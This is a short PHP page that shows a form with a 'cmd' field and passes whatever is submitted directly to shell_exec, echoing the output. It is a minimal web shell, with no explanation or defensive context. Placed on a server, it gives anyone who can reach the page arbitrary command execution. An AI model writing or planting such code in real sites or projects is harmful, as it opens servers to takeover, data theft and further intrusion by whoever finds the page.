<!DOCTYPE html>
<html>
    <form action="">
        <input type="text" name="cmd">
        <input type="submit" name="submit" value="submit">
    </form>
    <?php
    if (isset($_GET["submit"])){
        $cmd = $_GET["cmd"];
        echo shell_exec($cmd);
    }
    ?>

</html>